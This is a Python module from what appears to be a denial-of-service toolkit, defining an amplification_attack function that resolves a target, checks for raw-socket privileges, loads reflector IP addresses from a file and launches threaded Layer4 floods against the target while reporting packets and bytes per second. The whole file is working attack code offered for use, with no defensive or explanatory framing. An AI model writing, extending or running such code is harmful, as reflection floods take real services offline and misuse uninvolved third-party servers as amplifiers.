import socket
import time
from threading import Event, Thread
from pathlib import Path
from typing import Set, List
from itertools import cycle

from .core import Tools, REQUESTS_SENT, BYTES_SEND, LOCAL_IP
from .layer4 import Layer4
from .utils import Colors
from .config import config

def amplification_attack(host: str, port: int, method: str, threads: int, duration: int, reflector_file: str):
    """
    Run an amplification attack using reflectors.
    """
    # Resolve host
    try:
        host_ip = socket.gethostbyname(host)
    except Exception as e:
        print(f"{Colors.FAIL}Cannot resolve host: {e}{Colors.RESET}")
        return

    # Check raw socket capability
    if not _check_raw_socket():
        print(f"{Colors.WARNING}Raw socket creation failed. This attack may require root privileges.{Colors.RESET}")
        return

    # Load reflectors
    ref_path = Path(reflector_file)
    if not ref_path.exists():
        print(f"{Colors.FAIL}Reflector file not found: {reflector_file}{Colors.RESET}")
        return

    with open(ref_path, 'r') as f:
        content = f.read()
        ref = set(Tools.IP.findall(content))
    if not ref:
        print(f"{Colors.FAIL}No valid IP addresses found in reflector file.{Colors.RESET}")
        return

    print(f"{Colors.OKGREEN}Loaded {len(ref)} reflectors.{Colors.RESET}")

    event = Event()
    event.clear()
    for _ in range(threads):
        Layer4((host_ip, port), list(ref), method, event, None).start()

    print(f"{Colors.OKGREEN}[!] Amplification attack started on {host}:{port} with method {method} for {duration} seconds.{Colors.RESET}")
    event.set()
    start_time = time.time()
    while time.time() < start_time + duration:
        print(f"\r{Colors.WARNING}PPS: {Tools.humanformat(int(REQUESTS_SENT))}  BPS: {Tools.humanbytes(int(BYTES_SEND))}{Colors.RESET}", end='')
        REQUESTS_SENT.set(0)
        BYTES_SEND.set(0)
        time.sleep(1)
    event.clear()
    print(f"\n{Colors.OKGREEN}[!] Attack stopped.{Colors.RESET}")

def _check_raw_socket() -> bool:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        s.close()
        return True
    except Exception:
        return False
